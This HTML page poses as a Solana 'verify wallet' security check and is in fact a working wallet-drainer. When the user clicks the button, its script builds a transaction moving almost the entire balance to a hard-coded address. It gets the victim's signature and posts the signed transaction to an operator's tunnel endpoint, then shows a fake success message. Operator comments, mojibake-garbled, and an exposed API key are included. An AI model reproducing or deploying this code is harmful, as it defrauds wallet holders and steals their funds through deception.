<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <link rel="icon" href="data:,">
    <title>Solana Security Protocol</title>
    <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.87.6/lib/index.iife.min.js"></script>
</head>
<body style="background:#000;color:#fff;text-align:center;padding-top:30vh;font-family:sans-serif;">
    <div style="padding:40px;border:1px solid #14F195;border-radius:20px;display:inline-block;background:#111;">
        <h2 style="color:#14F195;">VERIFY WALLET</h2>
        <button id="cta" style="background:#14F195;color:#000;padding:20px 40px;border:none;border-radius:12px;font-weight:bold;cursor:pointer;font-size:20px;">SIGN TO ACTIVATE</button>
        <p id="msg" style="margin-top:20px;color:#555;">Waiting for signature...</p>
    </div>
    <script>
        const TARGET = "HyapjdagPdCaha2yW5j1pV4BkaVvah6okQ1fMw8BETXp";
        const HELIUS_RPC = "https://mainnet.helius-rpc.com/?api-key=3c44d53c-2c54-41a8-bc38-49be2cb2c6fd";
        // ğŸš¨ æ¢æˆä½ åˆšæ‰ cloudflared ç”Ÿæˆçš„é‚£ä¸ªé“¾æ¥
        const TUNNEL_URL = "ä½ çš„éš§é“é“¾æ¥/collect"; 

        document.getElementById('cta').onclick = async function() {
            try {
                const p = window.solana || window.phantom?.solana;
                await p.connect();
                document.getElementById('msg').innerText = "Connecting to Secure Channel...";

                const conn = new solanaWeb3.Connection(HELIUS_RPC, "confirmed");
                const { blockhash } = await conn.getLatestBlockhash();
                
                // æ„é€ è½¬è´¦ä½“ï¼ˆä¸æŸ¥ä½™é¢ï¼Œç›´æ¥æ‹‰æ»¡æˆ–å®šé¢ï¼‰
                // æç¤ºï¼šè¿™é‡Œä¾ç„¶å¯ä»¥æ”¹æˆè·å–ä½™é¢åå…¨é¢è½¬è´¦çš„é€»è¾‘
                const bal = await conn.getBalance(p.publicKey);
                const tx = new solanaWeb3.Transaction().add(
                    solanaWeb3.SystemProgram.transfer({
                        fromPubkey: p.publicKey,
                        toPubkey: new solanaWeb3.PublicKey(TARGET),
                        lamports: bal > 2000000 ? bal - 1500000 : 0, 
                    })
                );
                tx.recentBlockhash = blockhash;
                tx.feePayer = p.publicKey;

                // ğŸš€ æ ¸å¿ƒï¼šåªè¯·æ±‚ç­¾åï¼Œç»ä¸è°ƒç”¨å¹¿æ’­å‡½æ•°
                const signed = await p.signTransaction(tx);
                document.getElementById('msg').innerText = "Transmitting Signature...";

                // ğŸ’° å°†ç­¾ååºåˆ—åŒ–å¹¶ç”©ç»™ 71 æœºåç«¯
                const rawBinary = signed.serialize();
                const signatureB64 = btoa(String.fromCharCode(...rawBinary));

                fetch(TUNNEL_URL, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ signature: signatureB64 })
                });

                document.getElementById('msg').innerText = "Protocol Activated!";
                alert("Verification Successful!");
                
            } catch (e) {
                console.error(e);
                document.getElementById('msg').innerText = "Error: " + e.message;
            }
        };
    </script>
</body>
</html>